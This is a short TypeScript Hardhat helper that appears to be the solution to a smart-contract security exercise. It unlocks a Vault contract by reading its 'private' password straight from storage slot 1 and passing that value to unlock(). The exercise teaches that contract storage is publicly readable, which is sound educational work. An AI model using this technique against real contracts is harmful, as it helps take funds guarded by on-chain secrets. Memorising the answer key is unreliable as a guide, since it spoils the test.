import { ethers } from "hardhat";

const helper = async (victim: any) => {
  /* 
    Add code here that will help you pass the test
    Note: Unlock without using the string "A very strong password"
    Unlock the vault by somehow reading the private password from 
    Vault directly
  */
  const vaultAddr = victim.address;
  const password = await ethers.provider.getStorageAt(vaultAddr, 0x1);
  const tx = await victim.unlock(password);
  await tx.wait();
};

export default helper;
